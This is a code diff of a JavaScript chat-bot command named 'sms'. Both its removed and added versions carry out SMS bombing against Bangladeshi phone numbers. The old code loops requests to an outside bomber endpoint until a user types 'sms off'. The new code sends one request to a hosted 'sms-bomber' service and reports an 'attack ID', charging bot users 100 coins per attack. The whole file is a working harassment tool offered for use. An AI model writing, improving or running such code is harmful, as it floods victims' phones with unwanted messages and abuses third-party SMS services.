@@ -1,100 +1,70 @@
 const axios = require("axios");
-const bombingFlags = {};
 const deltaNext = 5;
 
 function expToLevel(exp) {
- return Math.floor((1 + Math.sqrt(1 + 8 * exp / deltaNext)) / 2);
+  return Math.floor((1 + Math.sqrt(1 + 8 * exp / deltaNext)) / 2);
 }
 
 module.exports = {
- config: {
- name: "sms",
- version: "2.2",
- author: "Chitron Bhattacharjee",
- countDown: 0,
- role: 0,
- shortDescription: {
- en: "Send SMS bomb"
- },
- description: {
- en: "Starts SMS bombing on a number for fun (cost: 100 coins)"
- },
- category: "tools",
- guide: {
- en: "sms 01xxxxxxxxx or sms off"
- }
- },
+  config: {
+    name: "sms",
+    version: "1.1.1",
+    author: "Azadx69x",
+    countDown: 15,
+    role: 0,
+    shortDescription: { en: "API call (BD)" },
+    category: "tools",
+    guide: { en: "sms bom 01xxxxxxxxx" }
+  },
 
- onChat: async function ({ event, message, args, usersData }) {
- const threadID = event.threadID;
- const senderID = event.senderID;
- const input = args.join(" ").trim();
+  onStart: async function ({ event, message, args, usersData }) {
+    const sub = args[0];
+    const number = args[1];
 
- if (!input.toLowerCase().startsWith("sms")) return;
+    if (sub !== "bom") {
+      return message.reply("Usage:\n)sms bom 01xxxxxxxxx");
+    }
 
- const number = input.split(" ")[1];
+    if (!number || !/^01[0-9]{9}$/.test(number)) {
+      return message.reply("📵 BD নাম্বার দিন\nউদাহরণ: )sms bom 01xxxxxxxxx");
+    }
 
- // 🧠 Get user info
- const userData = await usersData.get(senderID);
- const exp = userData.exp || 0;
- const balance = userData.money || 0;
- const level = expToLevel(exp);
+    const senderID = event.senderID;
 
- // ⛔ Level check
- if (level < 2) {
- return message.reply("🚫 এই কমান্ড ব্যবহার করতে আপনার লেভেল কমপক্ষে 2 হতে হবে!");
- }
+    const userData = await usersData.get(senderID);
+    const exp = userData?.exp || 0;
+    const balance = userData?.money || 0;
+    const level = expToLevel(exp);
 
- // 📴 Stop bombing
- if (number === "off") {
- if (bombingFlags[threadID]) {
- bombingFlags[threadID] = false;
- return message.reply("✅ SMS বোম্বিং বন্ধ করা হয়েছে।");
- } else {
- return message.reply("❗এই থ্রেডে কোনো বোম্বিং চলছিল না।");
- }
- }
+    if (level < 2) {
+      return message.reply("🚫 এই কমান্ড ব্যবহার করতে tk লাগবে");
+    }
 
- // ❌ Invalid number
- if (!/^01[0-9]{9}$/.test(number)) {
- return message.reply(
- "📱 একটি সঠিক বাংলাদেশি নম্বর দিন!\n" +
- "👉 উদাহরণ: sms 01xxxxxxxxx\n\n" +
- "💸 প্রতি বোম্বিং-এ ১০০ coin কাটা হবে!"
- );
- }
+    if (balance < 100) {
+      return message.reply(`❌ Not enough coins\n💵 you have: ${balance}\n📝 দরকার: 100`);
+    }
 
- // 🔁 Already bombing
- if (bombingFlags[threadID]) {
- return message.reply("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে লিখুন: sms off");
- }
+    await usersData.set(senderID, { money: balance - 100 });
 
- // 💸 Balance check
- if (balance < 100) {
- return message.reply(`❌ আপনার কাছে যথেষ্ট coin নেই!\n🔻 দরকার: 100 coin\n🪙 বর্তমান coin: ${balance}`);
- }
+    await message.reply(`📡 Sending request...\n📩 Target: ${number}`);
 
- // ✅ Deduct 100 coin
- await usersData.set(senderID, {
- money: balance - 100
- });
+    try {
+      const url = `https://shadowx-sms-bomber.onrender.com/smsb?num=${number}`;
+      const res = await axios.get(url, { timeout: 15000 });
+      const data = res.data;
 
- message.reply(`💥 SMS বোম্বিং শুরু হয়েছে ${number} নম্বরে...\n💸 ১০০ coin কেটে নেওয়া হয়েছে!\n🛑 বন্ধ করতে লিখুন: sms off`);
+      if (!data || data.success !== true) {
+        return message.reply("❌ API response unsuccessful");
+      }
 
- bombingFlags[threadID] = true;
+      return message.reply(
+        `✅ Request accepted\n` +
+        `🆔 Attack ID: ${data.attack_id || "N/A"}\n` +
+        `ℹ️ Message: ${data.message || "No message"}`
+      );
 
- (async function startBombing() {
- while (bombingFlags[threadID]) {
- try {
- await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
- } catch (err) {
- message.reply(`❌ ত্রুটি: ${err.message}`);
- bombingFlags[threadID] = false;
- break;
- }
- }
- })();
- },
-
- onStart: async function () {}
+    } catch (e) {
+      return message.reply("❌ API unreachable / blocked");
+    }
+  }
 };
